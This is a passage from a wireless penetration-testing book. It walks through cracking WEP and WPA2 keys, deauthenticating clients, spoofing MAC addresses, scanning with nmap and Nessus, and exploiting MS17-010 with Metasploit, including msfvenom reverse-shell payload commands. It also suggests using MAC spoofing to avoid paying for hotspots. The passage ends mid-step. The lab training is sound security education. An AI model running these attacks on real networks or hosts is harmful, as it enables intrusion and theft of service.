*   **The Kali Linux operating system**: All our security tools are preinstalled.
*   **Pen and paper to take notes**: This will help us to keep organized.

# [The plan for attacking wireless networks](#toc.xhtml#s74a)

Listed here are the actions to plan a wireless attack:

1.  Scan for a list of wireless networks in the area.
2.  Take note of the BSSID, Channel number, and encryption.
3.  List several attack methods that you will use to attack: 
    1.  Airodump
    2.  Aircrack
    3.  Dictionary attack
    4.  Default logins
    5.  Password guessing
4.  Proceed with each method.
5.  Record both successful and unsuccessful results.
6.  Try again.

# [Wireless password cracking](#toc.xhtml#s75a)

There are various methods to crack wireless encryption. Here, we will discuss the most typical solutions to crack wireless networks. In the next several sections, we will discuss what each wireless encryption is in excellent detail and will demonstrate how exactly to crack those wireless encryption varieties. Let us begin!

# [WEP encryption](#toc.xhtml#s76a)

Even though the WEP protocol was acknowledged to be defective as early as 2000, it is still in use, and access points are being shipped with WEP-enabled capabilities.

WEP has several cryptographic flaws that have been identified by Walker, Arbaugh, Fluhrer, Martin, Shamir, KoreK, and others. The cryptographic evaluation of WEP is outside the scope of this book because it necessitates a thorough understanding of sophisticated math. In this section, we will look at how to crack WEP encryption on the Kali platform using easily available tools. This includes airmon-ng, aireplay-ng, airodump-ng, aircrack-ng, and additional tools from the aircrack-ng suite.

The usage of RC4 with a short IV value that is recycled every 224 frames is WEP’s core flaw. Although this is a huge amount, per 5,000 packets, there is a 50% probability of four reuses. To take advantage of this, we generate a huge quantity of traffic to enhance the possibility of reused IVs and so compare two cypher texts encrypted with the same IV and key, as shown in *[Figure 4.1](#c04.xhtml#fig4_1)*:

![](images/Figure-4.1.jpg)

**Figure 4.1:** WEP encryption

# [Cracking WEP encryption](#toc.xhtml#s77a)

We will go through step-by-step instructions on how to crack WEP encryption in this part.

1.  Connect to our access point Wireless Lab and navigate to the section of the settings that deal with wireless encryption mechanisms, as shown in *[Figure 4.2](#c04.xhtml#fig4_2).* Setting the Security Options to WEP on my access point accomplishes this. We will also need to adjust the length of the WEP key. We have configured WEP to use 64bit keys, as indicated in *[Figure 4.2](#c04.xhtml#fig4_2)*. We have set the default key to WEP Key 1 and the 64-bit WEP key value to 0123456789 in hex. You can change it to whatever you want. 
    
    ![](images/Figure-4.2.jpg)
    
    **Figure 4.2:** Netgear router setting
    
    Once the changes have been made, the access point should now be able to use WEP as an encryption method. Let us get the attacker machine up and running.
    
2.  Open a Terminal window and type the following command, then hit *Enter*: 
    
    ` airmon-ng start wlan0`
    
    The `wlan0` interface will be started in monitor mode with this command. Monitor mode allows your computer to listen in on every wireless packet that passes through your wireless card’s range. We will be able to inject packets into a wireless network using this technique. The result is shown in *[Figure 4.3](#c04.xhtml#fig4_3)*:
    
    ![](images/Figure-4.3.jpg)
    
    **Figure 4.3:** airmon-ng command
    
3.  Then press *Enter* after typing the following command: 
    
    ` airodump-ng wlan0`
    
    This command turns on the wireless interface’s monitor mode. The result is shown in *[Figure 4.4](#c04.xhtml#fig4_4)*:
    
    ![](images/Figure-4.4.jpg)
    
    **Figure 4.4:** airodump-ng command\_1
    
4.  Press *Enter* after typing the following command: 
    
    ` airodump-ng -c 1 -w capture --bssid DC:EF:09:59:B1:1F wlan0`
    
    The components of the command are as follows:
    
    *   `-c`: this is the channel
    *   `-w`: this gives a write access to a file
    *   `–bssid`: this is the wireless access point MAC address
    
    *[Figure 4.5](#c04.xhtml#fig4_5)* is the output of the previous command:
    
    ![](images/Figure-4.5.jpg)
    
    **Figure 4.5:** airodump-ng command\_2
    
    Let us connect our wireless client to the access point and use the WEP key 0123456789. When the client connects successfully, `airodump-ng` should display a message on the screen.
    
    To exploit flaws in the protocol, we require a large number of data packets encrypted with the same key as in the scenario of the busy network as well. As a result, we will need to make the network produce more data packets. We will use the `aireplay-ng` utility to accomplish this.
    
5.  Press *Enter* after typing the following command, as shown in *[Figure 4.6](#c04.xhtml#fig4_6)*: 
    
    `airplay-ng -1 1000 -q 10 -e ‘Wireless Lab’ -a DC:EF:09:59:B1:1F -h 00:11:22:33:44:55 wlan0 --ignore-negative-one`
    
    The following are the components of the command:
    
    *   `-1`: This is the number of packets per burst
    *   `-q`: This is the number of seconds between keep-alives
    *   `-e`: This sets the target AP SSID
    *   `-a`: This sets the access point MAC address
    *   `-h`: This sets the source MAC address (`00:11:22:33:44:55` is the spoofed MAC address)
    *   `--ignore-negative-one`: This resolves the fixed channel on wlan0
    
    ![](images/Figure-4.6.jpg)
    
    **Figure 4.6:** aireplay-ng command\_1
    
6.  We will use aireplay-ng to intercept ARP packets on the wireless network and inject them back into it to imitate ARP answers. As indicated in *[Figure 4.7](#c04.xhtml#fig4_7)*, we will run aireplay-ng in a separate window. We will generate a lot of data traffic on the network if we repeat these packets a few thousand times. Even though Aireplay-ng does not have access to the WEP key, it can detect ARP packets based on their size. Because ARP is a fixed header protocol, the size of ARP packets can be easily estimated and used to identify them even when the communication is encrypted. We will use aireplay-ng with the choices we will go over next. The `-3` option is for ARP replay, the `-b` option is for our network’s BSSID, and the `–h` option is for the spoofing client’s MAC address. Replay attacks will only work for authorized and associated client MAC addresses, so we need to accomplish this, as shown in *Figure.4.7*: 
    
    `aireplay-ng -3 -b DC:EF:09:59:B1:1F -h 00:11:22:33:44:55 wlan0`
    
    ![](images/Figure-4.7.jpg)
    
    **Figure 4.7:** aireplay-ng command\_2
    
7.  Airodump-ng will also begin registering many data packets at this moment. The capture files contain all these intercepted packets.
8.  Let us start with the actual cracking! In a new window, we run aircrack-ng with the `capture-01.cap` option. This will launch the aircrack-ng program, which will begin cracking the WEP key using the data packets in the file. Airodump-ng should gather WEP packets, aireplay-ng should perform the replay attack, and aircrack-ng should attempt to crack the WEP key based on the collected packets all at the same time. All of them are open in distinct windows in this experiment. Press *Enter* after typing the following command, as shown in *[Figure 4.8](#c04.xhtml#fig4_8):*
    
    ` aircrack-ng capture-01.cap`
    
    ![](images/Figure-4.8.jpg)
    
    **Figure 4.8:** aircrack-ng command
    

The number of data packets necessary to crack the key is nondeterministic; however, it is typically in the hundreds of thousands or more. This should take no more than 5–10 minutes on a fast network (or using aireplay-ng). If the current quantity of data packets in the file is insufficient, aircrack-ng will pause and wait for more packets to be collected; the cracking procedure will then be restarted. Aircrack-ng should be able to break the key once enough data packets have been gathered and analyzed.

Congratulations on successfully cracking a WEP encrypted network if you were able to crack the network key! Do not be concerned if you do not succeed. Each wireless access point and network is unique. It also depends on the strength of the signal between you and the access point, as well as the level of encryption used.

It is crucial to understand that WEP is completely defective, and Aircrack-ng can crack any WEP key (no matter how complex). The only need is that aircrack-ng has access to a big enough number of data packets encrypted with this key.

**Note: We can also use the Shared Key Authentication bypass approach we learned in the previous chapter to impersonate an authentication to the access point. If the legitimate client exits the network, this can be useful. This will allow us to spoof authentication and association while still sending our replayed packets into the network.**

# [WPA and WPA2 encryption](#toc.xhtml#s78a)

The TKIP encryption algorithm is primarily used by WPA. TKIP was created with the goal of upgrading WEP without requiring fully new hardware. WPA2, on the other hand, uses the AES-CCMP encryption technique, which is far more powerful and robust than TKIP.

Both WPA and WPA2 support EAP-based authentication via RADIUS servers (Enterprise) or a **Pre-Shared Key** (**PSK**)-based authentication schema (Personal).

A dictionary attack can be used against WPA/WPA2 PSK. The four-way WPA handshake between the client and access point, as well as a wordlist of common passphrases, are necessary for this attack. We may next try to crack the WPA/WPA2 PSK pass using tools like Aircrack-ng.

The four-way handshake is depicted in *[Figure 4.9](#c04.xhtml#fig4_9)*:

![](images/Figure-4.9.jpg)

**Figure 4.9:** WPA/WPA2 authentication diagram

The **Pairwise Transient Key** (**PTK**) is calculated using the PSK and five other parameters: SSID of Network, **Authenticator Nounce** (**ANounce**), **Supplicant Nounce** (**SNounce**), **Authenticator MAC address** (**Access PointMAC**), and Suppliant MAC address (Wi-Fi Client MAC). The data between the access point and the client is then encrypted using this key.

All five factors described in the previous paragraph can be obtained by an attacker smelling the air and listening to the entire conversation. The PSK is the only thing he lacks. So, how does a PSK get made? It is calculated by combining the WPA-PSK pass and the SSID provided by the user. The **Password-Based Key Derivation Function** (**PBKDF2**) is used to generate the 256-bit shared key from the combination of both.

The attacker would employ a big dictionary of possible passphrases with the attack tool in a standard WPA/WPA2 PSK dictionary assault. The tool would generate the PTK by extracting the 256-bit PSK from each of the passphrases and combining it with the other parameters specified earlier. One of the handshake packets’ **Message Integrity Check** (**MIC**) will be verified using the PTK. If the pass from the dictionary matches, the guess was accurate; if not, it is incorrect.

If the authorized network passphrase is found in the dictionary, it will eventually be identified. This is how PSK is cracking for WPA/WPA2 works! The steps are illustrated in *[Figure 4.10](#c04.xhtml#fig4_10)*:

![](images/Figure-4.10.jpg)

**Figure 4.10:** WPA/WPA2 dictionary attack

We will see how to break into a WPA PSK wireless network. To breach a WPA2-PSK network using CCMP(AES), the same techniques must be followed.

# [Cracking WPA-PSK and WPA2-PSK passphrase](#toc.xhtml#s79a)

To get started, simply follow the provided instructions.

1.  Let us first connect to our Wireless Lab access point and configure it to use WPA2-PSK \[AES\]. We will change the WPA2-PSK \[AES\] password to `abcdefgh` to make it vulnerable to dictionary attacks, as shown in *[Figure 4.11](#c04.xhtml#fig4_11)*: 
    
    ![](images/Figure-4.11.jpg)
    
    **Figure 4.11:** Netgear router setting
    
2.  Type the following command into the Terminal: 
    
    ` airmon-ng start wlan0`
    
    The `wlan0` interface will be started in monitor mode with this command, as shown in *[Figure 4.12](#c04.xhtml#fig4_12)*:
    
    ![](images/Figure-4.12.jpg)
    
    **Figure 4.12:** airmon-ng command
    
3.  Press *Enter* after typing the following command: 
    
    ` airodump-ng wlan0`
    
    We will be able to inject packets into a wireless network because of this, as shown in *[Figure 4.13](#c04.xhtml#fig4_13)*:
    
    ![](images/Figure-4.13.jpg)
    
    **Figure 4.13:** airodump-ng command\_1
    
4.  Press *Enter* after typing the following command, as shown in *[Figure 4.14](#c04.xhtml#fig4_14)*: 
    
    ` airodump-ng -c 11 -w wpacracking --bssid DC:EF:09:59:B1:1F wlan0`
    
    ![](images/Figure-4.14.jpg)
    
    **Figure 4.14:** airodump-ng command\_2
    
5.  We can either wait for a fresh client to connect to the access point so that we can capture the four-way WPA2 handshake or we can force clients to re-join by sending a broadcast deauthentication packet. To make things go faster, we do the latter. With the unknown channel error, the same thing can happen. Use `--ignore-negative-one` once more. This may necessitate multiple attempts, as shown in *[Figure 4.15](#c04.xhtml#fig4_15)*: 
    
    `aireplay-ng --deauth 1 -a DC:EF:09:59:B1:1F wlan0 --ignore-negative-one`
    
    ![](images/Figure-4.15.jpg)
    
    **Figure 4.15:** aireplay-ng command
    
6.  When we capture a WPA2 handshake, the airodump-ng program will display a WPA2 handshake followed by the access point’s BSSID in the top-right corner of the screen. If you choose `– ignore-negative-one`, the tool may send a fixed channel message instead of the WPA2 handshake. Keep a lookout for a WPA2 handshake that flashes briefly.
7.  We can now terminate the airodump-ng utility. Let us look at the four-way handshake in Wireshark by opening the cap file. *[Figure 4.16](#c04.xhtml#fig4_16)* shows how your Wireshark terminal should look. In the snapshot, we have selected the first packet of the four-way handshake from the trace file. The EAPOL protocol is used in the handshake packets, as seen in *[Figure 4.16](#c04.xhtml#fig4_16),* where the handshake does not contain data that helps recover the key but contains data that can be used to check if a key is valid or not. 
    
    ![](images/Figure-4.16.jpg)
    
    **Figure 4.16:** Wireshark
    
8.  Now, we will start with the real key cracking! We will need a glossary of common words for this. Many dictionary files are included in Kali’s **Metasploit** folder, as illustrated in *[Figure 4.17](#c04.xhtml#fig4_17)*. It is vital to remember that you are only as good as your dictionary when it comes to WPA2 cracking. Kali comes with a few dictionaries, but they may not be enough. People’s passwords are influenced by a variety of factors. This contains information such as the users’ home nation, prevalent names and phrases in that region, security knowledge, and a variety of other factors. When doing a penetration test, it is a good idea to combine country- and region-specific wordlists, as shown in *[Figure 4.17](#c04.xhtml#fig4_17)*: 
    
    ![](images/Figure-4.17.jpg)
    
    **Figure 4.17:** Metasploit
    
9.  As demonstrated in *[Figure 4.18](#c04.xhtml#fig4_18)*, we will use the aircrack-ng software with the `pcap` file as the input and a link to the dictionary file as the output. As displayed in the terminal, I used `nmap.lst`: 
    
    `aircrack-ng wpacracking-05.cap -w /usr/share/wordlists/nmap.lst`
    
    The dictionary file is used by aircrack-ng to test various combinations of passwords to crack the key. If the password is in the dictionary file, it will be cracked eventually, and your screen will look like the one in *[Figure 4.18](#c04.xhtml#fig4_18)*:
    
    ![](images/Figure-4.18.jpg)
    
    **Figure 4.18:** aircrack-ng command
    
10.  Please keep in mind that because this is a dictionary attack, the password must be present in the dictionary file you submit to aircrack-ng. The attack will fail if the pass is not found in the dictionary!

**We feed the capture file containing the WPA2 four-way handshake and a list of common passphrases (in the form of a wordlist) to Aircrack-ng because WPA2-PSK is vulnerable to a dictionary attack. Aircrack-ng can crack the WPA2-PSK shared pass because the pass abcdefgh is contained in the wordlist. It is worth repeating that you are only as good as the dictionary you have in WPA2 dictionary-based cracking. As a result, it is critical to start by compiling a vast and detailed lexicon. Even though Kali comes with its own vocabulary, it may be insufficient at times and require additional words.**

# [Speeding up WPA and WPA2 Cracking](#toc.xhtml#s80a)

As we saw in the last section, if we have the right password in our dictionary, breaking WPA2-Personal is a piece of cake. So, why do we not simply compile a massive dictionary of millions of commonly used passwords and phrases? This would be extremely beneficial to us, and we would almost always succeed in cracking the password. Everything sounds fantastic, but there is one thing missing: the time spent. The Pre-Shared key using the PSK pass and the SSID through the PBKDF2 is one of the more CPU and time-consuming calculations. Before returning the 256-bit Pre-Shared key, this function hashes the combination of both over 4,096 times. The next stage in the cracking process is to use this key, along with parameters from the four-way handshake, to verify the handshake against the MIC. This is a low-cost computational phase. Furthermore, the characteristics of the handshake will vary from time to time; therefore, this phase cannot be pre-calculated. As a result, to speed up the cracking process, we must calculate the Pre-Shared key from the pass as quickly as feasible.

Pre-calculating, the Pre-Shared Key, also known as the **Pairwise Master Key** (**PMK**) in 802.11 standard jargon, can help speed things up. It is worth noting that because the SSID is also used to calculate the PMK, we will get a different PMK if we use the same pass but a different SSID. As a result, the PMK is dependent on both the passcode and the SSID.

# [Speeding up the cracking process](#toc.xhtml#s81a)

We can go ahead and do the following:

1.  Using the genpmk tool, we can compute the PMK for a given SSID and wordlist ahead of time: 
    
    `genpmk -f <chosen wordlist> -d PMK-Wireless-Lab -s “Wireless Lab”`
    
    This generates the PMK-Wireless-Lab file, which contains the PMK, as can be seen in *[Figure 4.19](#c04.xhtml#fig4_19)*:
    
    ![](images/Figure-4.19.jpg)
    
    **Figure 4.19:** genpmk command
    
2.  We will now build a WPA-PSK network with the passphrase `abcdefgh` (found in the dictionary) and capture a WPA handshake for it. As illustrated in the accompanying *[Figure 4.20](#c04.xhtml#fig4_20)*, we now use Cowpatty to crack the WPA passphrase: 
    
    `cowpatty -d PMK-Wireless-Lab -s “Wireless Lab” -r wpacracking-05.cap`
    
    ![](images/Figure-4.20.jpg)
    
    **Figure 4.20:** Cowpatty command
    
    Cowpatty uses the pre-calculated PMKs to crack the key in approximately 6 seconds.
    
3.  With the same dictionary file, we now run aircrack-ng, and the cracking operation takes almost 22 minutes. This demonstrates how much we gain because of the pre-calculation.
4.  We will need to use a tool named airolib-ng to use these PMKs with aircrack-ng. as the following: 
    
    ` airolib-ng PMK-Aircrack --import cowpatty PMK-Wireless-Lab`
    
    Where PMK-Aircrack is the aircrack-ng compatible database to be built, and PMK-Wireless-Lab is the previously created genpmk-compliant PMK database. Refer to *[Figure 4.21](#c04.xhtml#fig4_21)*:
    
    ![](images/Figure-4.21.jpg)
    
    **Figure 4.21:** airolib-ng command
    
5.  We now feed this database to aircrack-ng, which significantly speeds up the cracking process. The following command is used, as shown in *[Figure 4.22](#c04.xhtml#fig4_22):*
    
    ` aircrack-ng -r PMK-Aircrack wpacracking-05.cap`
    
    ![](images/Figure-4.22.jpg)
    
    **Figure 4.22:** aircrack-ng command
    
6.  Additional Kali tools, like Pyrit, can make use of multi-processor platforms to speed up cracking. Intel® CoreTM i7 CPUs, for example, can do faster cracking operations. The `–r` option specifies the `pcap` filename, whereas I specify the genpmk-compliant PMK file. Pyrit takes roughly 3 seconds to break the key on the same system as the preceding tools, using the same PMK file prepared using genpmk.

**In addition to the aforementioned factors, the length of the WPA/WPA2 PSK plays a major role in the cracking process. The cracking of longer passes takes longer.**

# [Spoofing your mac address](#toc.xhtml#s82a)

You might be aware that MAC address filtering is not entirely secure. It is much less effective than WEP encryption, in my opinion, because it is trivial to forge. This is not to say that MAC address filtering is not useful. It does filter out many attackers who are only interested in the weakest link networks. Whatever you do, do not rely just on MAC filtering! WEP encryption is preferable to no encryption. Refer to *[Figure 4.23](#c04.xhtml#fig4_23)* for an illustration of MAC Spoofing:

![](images/Figure-4.23.jpg)

**Figure 4.23:** MAC spoofing

This does not necessitate a high level of competence. All you must do is listen in on wireless network traffic and change your MAC address to someone who is already connected. Changing your MAC address is as simple as 1, 2, and 3 with automation scripts or applications. Then, using an application called macchanger, let us see how we can spoof our MAC address.

1.  Open the Terminal.
2.  Press *Enter* after typing the following command: 
    
    ` ifconfig wlan0 down`
    
    This command disables or turns off the wireless interface, as shown in *[Figure 4.24](#c04.xhtml#fig4_24)*:
    
    ![](images/Figure-4.24.jpg)
    
    **Figure 4.24:** ifconfig wlan0 down command
    
3.  To reactivate `wlan0`, use the following command and press *Enter*, as shown in *[Figure 4.25](#c04.xhtml#fig4_25)*: 
    
    ` ifconfig wlan0 up`
    
    ![](images/Figure-4.25.jpg)
    
    **Figure 4.25:** ifconfig wlan0 up command
    
4.  Press *Enter* after typing the following command: 
    
    ` macchanger --random wlan0`
    
    This command generates a fake MAC address for the wireless interface at random, as shown in *[Figure 4.26](#c04.xhtml#fig4_26):*
    
    ![](images/Figure-4.26.jpg)
    
    **Figure 4.26:** macchanger command\_1
    
5.  Press Enter after typing the following command: 
    
    ` macchanger --mac=00:11:22:33:44:55 wlan0`
    
    As displayed, this command allows you to fake a MAC address on the wireless interface, as shown in *[Figure 4.27](#c04.xhtml#fig4_27)*:
    
    ![](images/Figure-4.27.jpg)
    
    **Figure 4.27:** macchanger command\_2
    

It is as simple as that! Is it not simple? Knowing this can help you avoid paid hotspot networks where you must pay money for a long period of time. These networks will be available in coffee shops, restaurants, airports, and hotels. When a user pays, their MAC address is added to the list of permitted MAC addresses for internet access.

# [Protect yourself from wireless attacks](#toc.xhtml#s83a)

We must always be aware of how to defend ourselves against such dangers and attacks.

Following that, we will go over ways to defend yourself against these attacks:

*   Encryption that is more robust reduces the likelihood of an attack.
*   MAC filtering can also help to lessen the chances of an attack.
*   If your devices are not compatible with WPA/WPA2, you can use WEP instead; however, it is not suggested because it is insecure.
*   To restrict access to a business network, create a distinct VLAN.
*   WPS settings should be disabled or turned off.
*   Make a strong, complicated passphrase.
*   Passwords should be changed every three to four months.
*   Use the manufacturer’s default passwords only as a last resort.
*   Instead of PSK, use EAP.
*   Change the SSID name that comes up by default.

# [Conclusion](#toc.xhtml#s84a)

We put prepared an offensive plan in this chapter. Following that, we outlined many attack methods. Then we went through the details of WEP, WPA, and WPA2 encryption. Finally, we outlined a few strategies for reducing the likelihood of a wireless attack.

In the upcoming chapter, we will look at how to identify hosts on a wireless network, figure out how big it is, and spot susceptible devices and systems on it. Let us start!

# [Questions](#toc.xhtml#s85a)

1.  Explain the WEP encryption?
2.  How do you crack the WEP encryption?
3.  Explain the WPA/WPA2 encryption?
4.  How crack the WPA/WPA2 encryption?
5.  How do you protect yourself from wireless attacks?

# [CHAPTER 5](#toc.xhtml#c05)

# [Gain Access to Wireless Network](#toc.xhtml#c05)

# [Introduction](#toc.xhtml#s86a)

We have arrived at the fifth chapter! In this chapter, we will cover a variety of topics related to having network access as a wireless penetration tester. We will conduct network evaluations to identify hosts, calculate network size, and identify vulnerable hosts. When doing a penetration test, it is a good idea to know how many hosts are on the network because you do not want to leave anything out. Let us start by talking about why this is so crucial.

# [Structure](#toc.xhtml#s87a)

In this chapter, we will discuss the following topics:

*   Identifying hosts
*   Determining network size
*   Detecting vulnerable hosts
*   Preventing against threats

# [Objectives](#toc.xhtml#s88a)

In this chapter, you will understand why it is important to find the number of live hosts when conducting a penetration test on a network. Next, you will be identifying hosts on the network with Kali Linux. Then, you will determine network size and explain why it is important to understand as a penetration tester. In the end, you will be able to detect vulnerabilities in Windows 7 using the Nessus vulnerability scanner, and you will able also to use several preventions that could help reduce risk.

We need to know if there is a client on the network that is running Windows 7. The user understands they are in danger because they are running an outdated version of Windows. In a matter of minutes, Windows 7 can be hacked! Microsoft stopped supporting Windows 7 in January 2020. Because Windows 7 is no longer maintained, attackers will flock to this version of the operating system in quest of flaws. The reason for this is that Microsoft will no longer offer security patches, which means that if an attacker discovers a hole in the system, it will remain susceptible indefinitely.

We will use a variety of networking tools to figure out how many hosts are on the network, what operating system they are running, how big the network is, and which ones are vulnerable. Knowing what parts of the network are susceptible and then applying security patches or upgrades will help to improve security. Keep in mind that not only the systems and equipment in your business are vulnerable but also the people!

This is certainly one of the most serious security threats one encounter. Your employees should go through a security awareness program to learn about the good and bad, as well as the dos and don’ts. You may also have employees that share consumer information outside of the workplace for financial advantage. Keep a watch out for any unusual conduct that could jeopardize the company’s operations.

# [Identifying hosts](#toc.xhtml#s89a)

This section covers the various tools available for identifying hosts on a network. These programs will provide a user’s IP address, MAC address, open and closed ports, services, operating system, and other details. The following sections contain a list of Kali Linux tools that can be used to identify hosts on a network.

# [Network mapping tools](#toc.xhtml#s90a)

The command-line interface of Nmap will be the center of our attention. Here are some alternative network mapping tools to consider:

*   0trace
*   Angry IP scanner
*   hping2 and hping3
*   lanmap and lanmap2
*   TCP traceroute

You will learn how to use Nmap to identify hosts on a network in this tutorial. When it comes to network discovery or determining whether a network service, such as Telnet, SSH, or FTP, is running, these tools are by far my favorites. Let us get started!

1.  Open the Terminal
2.  Press *Enter* after typing the following command: 
    
    ` Ifconfig`
    
    In this case, our private IP address is `192.168.1.128`, as shown in *[Figure 5.1](#c05.xhtml#fig5_1)*. Because our gateway is `192.168.1.1`, we will see how to scan the entire subnet next.
    
    ![](images/Figure-5.1.jpg)
    
    **Figure 5.1:** Ifconfig command
    
3.  Press *Enter* after typing the following command: 
    
    ` nmap 192.168.X.0/24`
    
    This command initiates a ping sweep on all hosts on the `192.168.1.1` through `192.168.1.254` range. You will notice some intriguing information in your output, such as open and closed ports, services, and the operating system they are using.
    
    We can detect multiple systems and devices on the local network, as shown in *[Figure 5.2](#c05.xhtml#fig5_2)*:
    
    ![](images/Figure-5.2.jpg)
    
    **Figure 5.2:** nmap command
    
4.  If you have a firewall installed on your network, run the following command: 
    
    ` nmap -PN 192.168.X.0/24`
    
    All hosts will be treated as online, and host discovery will be skipped. It is used to get beyond standard firewall filters to see if the firewall is up and running, as shown in *[Figure 5.3](#c05.xhtml#fig5_3):*
    
    ![](images/Figure-5.3.jpg)
    
    **Figure 5.3:** nmap command\_2
    

# [Determining the network size](#toc.xhtml#s91a)

It is not difficult to figure out how big your network is. It will be a lot easier if you already have some networking experience. Let us walk through a few steps to figure out how big the network is and how many hosts we have.

# [Determining the network size using Kali Linux](#toc.xhtml#s92a)

We will determine the network size in Kali Linux in this tutorial. To do so, follow the given steps:

1.  Open the Terminal.
2.  Press *Enter* after typing the following command: 
    
    ` Ifconfig | grep mask`
    
    *[Figure 5.4](#c05.xhtml#fig5_4)* is the output:
    
    ![](images/Figure-5.4.jpg)
    
    **Figure 5.4:** ifconfig command\_2
    

To go to your network configuration, you will need to scroll up and down. In *[Figure 5.4](#c05.xhtml#fig5_4)*, the subnet mask is 255.255.255.0. If we do some subnetting math, we can figure out that this network might have somewhere between 1 and 254 hosts.

What does establishing the network size have to do with penetration testing, you might wonder? The penetration tester can estimate the number of hosts on a network by determining the network size. When the number of networks in a data center or college campus is known, this can make a penetration test easier.

# [Detecting vulnerable hosts](#toc.xhtml#s93a)

This section is rather self-explanatory. If you know someone who does not update their system daily, they are certainly vulnerable to the most recent security risks. As of right now, Windows 7 is extremely insecure, especially if the user has not installed any updates or service packs. Let us see a vulnerability in Windows 7 in the upcoming example.

Let us look at the steps:

1.  Scanning the target for services in use, as shown in *[Figure 5.5](#c05.xhtml#fig5_5):*
    
    ![](images/Figure-5.5.jpg)
    
    **Figure 5.5:** nmap command\_3
    
    OS detection, version detection, script scanning, and traceroute are all possible with this command.
    
2.  Use Nessus to scan for vulnerabilities. (If you are running Nessus for the first time, please note that you will need to register Nessus first.)
3.  We provided the IP address of the host we are going to scan for vulnerabilities in the following, as shown in *[Figure 5.6](#c05.xhtml#fig5_6):*
    
    ![](images/Figure-5.6.jpg)
    
    **Figure 5.6:** Nessus\_1
    
4.  We are now ready to click Launch to begin our Nessus scan, as illustrated in *[Figure 5.7](#c05.xhtml#fig5_7):*
    
    ![](images/Figure-5.7.jpg)
    
    **Figure 5.7:** Nessus\_2
    
5.  After the scan is completed, we must examine the report, as shown in *[Figure 5.8](#c05.xhtml#fig5_8):*
    
    ![](images/Figure-5.8.jpg)
    
    **Figure 5.8:** Nessus\_3
    
6.  As you can see from our findings, there are various services that are vulnerable, as shown in *[Figure 5.9](#c05.xhtml#fig5_9):*
    
    ![](images/Figure-5.9.jpg)
    
    **Figure 5.9:** Nessus\_4
    
    When you select one of them and look at the name of the plugin, you will see MS17-010. We will use this later to locate our exploit.
    
7.  Let us start looking for our exploit. Use the following command to start a fresh Metasploit console, and refer to *[Figure 5.10](#c05.xhtml#fig5_10):*
    
    ` msfconsole`
    
    ![](images/Figure-5.10.jpg)
    
    **Figure 5.10:** msfconsole command
    
    **[https://www.rapid7.com/products/metasploit/download.jsp](https://www.rapid7.com/products/metasploit/download.jsp)** is where you can get the Metasploit Framework. H. D. Moore created the Metasploit Framework in 2003 as an open-source attack framework. It is used to break into systems and gadgets for the purpose of testing. It contains information for penetration testers, IDS signature developers, and exploit researchers.
    
8.  Type the following into your search engine to find our exploit: 
    
    ` search ms17`
    
    The result is shown in *[Figure 5.11](#c05.xhtml#fig5_11):*
    
    ![](images/Figure-5.11.jpg)
    
    **Figure 5.11:** msfconsole command\_2
    
9.  Complete the following commands:  
    *   `use exploit/windows/smb/ms17_010_eternalblue`: This command sets Metasploit Framework to use the exploit `ms17_010_eternalblue`
    *   `set RHOST 192.168.1.129`: This command sets the remote host to the user whom you are exploiting.
    *   `set PAYLOAD windows/x64/meterpreter/reverse_tcp`: This command sets the payload to `reverse_tcp` so that we can connect back to the host after the exploit was successful.
    *   `set LHOST 192.168.1.128`: This command sets the localhost, which is the Kali Linux host’s IP address.
    *   `exploit:` This command launches the exploit in real time so you can see the details in action.
10.  Use the command: if you want to run a different payload: 
     
     ` show payloads`
     
     The output of the commands we entered previously can be seen in *[Figure 5.12](#c05.xhtml#fig5_12)*:
     
     ![](images/Figure-5.12.jpg)
     
     **Figure 5.12:** msfconsole command\_3
     
     Unfortunately, the exploit is not run correctly because it supports ×64 targets only, and our target is ×86. Now, we will use another tool to exploit our target, such as the **searchsploit** tool, as shown in *[Figure 5.13](#c05.xhtml#fig5_13):*
     
     ![](images/Figure-5.13.jpg)
     
     **Figure 5.13:** searchsploit command
     
11.  Enter the following command, and refer to *[Figure 5.14](#c05.xhtml#fig5_14):*
     
     ` searchsploit ms17-010`
     
     ![](images/Figure-5.14.jpg)
     
     **Figure 5.14:** searchsploit command\_2
     
12.  Before we proceed, we should make a copy of this file so that we can access the original source code. To keep things simple, we can rename it `exploit.py`, as shown in *[Figure 5.15](#c05.xhtml#fig5_15).* We will enter the following command to get the full path of the exploit: 
     
     ` searchsploit -p windows/remote/42031.py`
     
     Then, we will enter the following command to copy the exploit:
     
     `cp /usr/share/exploitdb/exploits/windows/remote/42031.py exploit.py`
     
     ![](images/Figure-5.15.jpg)
     
     **Figure 5.15:** Copy command
     
13.  We may now edit the Python file and check the supported targets, as shown in *[Figure 5.16](#c05.xhtml#fig5_16)*: 
     
     ![](images/Figure-5.16.jpg)
     
     **Figure 5.16:** Exploit file
     
14.  Now, we can try to run the exploit, as shown in *[Figure 5.17](#c05.xhtml#fig5_17):*
     
     ![](images/Figure-5.17.jpg)
     
     **Figure 5.17:** exploit output
     
     There is an error (no module named `impacket`) which means that `impacket` package is not installed. So, we will run the following command to fix this error, as shown in *[Figure 5.18](#c05.xhtml#fig5_18).*
     
     ` sudo python2 -m pip install impacket`
     
     ![](images/Figure-5.18.jpg)
     
     **Figure 5.18:** Install impacket module
     
15.  Now, we can try to run the exploit again, as shown in *[Figure 5.19](#c05.xhtml#fig5_19)*: 
     
     ![](images/Figure-5.19.jpg)
     
     **Figure 5.19:** Run exploit.py
     
     The exploit seems to work correctly, but it needs a target IP, `shellcode_file`, and `numGroomConn`, where our target IP is `192.168.1.129`, and we can create `shellcode_file` using `msfvenom` tool as shown in *[Figure 5.20](#c05.xhtml#fig5_20)*.
     
     `msfvenom -a x86 --platform windows -p windows/shell/reverse_shell LHOST=192.168.1.128 LPORT=4444 > shellcode`
     
     ![](images/Figure-5.20.jpg)
     
     **Figure 5.20:** msfvenom command
     
     And `numGroomConn` is an optional parameter that, by default, has the value 13. It is used in the `EternalBlue` exploit script for the buffer overflow attack. If the exploit fails, but the target does not crash, then try increasing the `numGroomConn` value.
     
16.  Currently, we can try to run the exploit with the given parameters, as shown in *[Figure 5.21](#c05.xhtml#fig5_21):*
     
     ![](images/Figure-5.21.jpg)
     
     **Figure 5.21:** Exploit output
     
     Although the script did not work in the end, the debugging methods were instructive. Now, we will go back to Step 11 and select another exploit, such as `42315.py,` to try it.
     
17.  Repeat Step 12. Now, we can open the exploit and enter a valid username and password of our target, as shown in *[Figure 5.2](#c05.xhtml#fig5_2)*2: 
     
     ![](images/Figure-5.22.jpg)
     
     **Figure 5.22:** Exploit file
     
18.  Now, we can try to run the exploit, as shown in *[Figure 5.23](#c05.xhtml#fig5_23)*: 
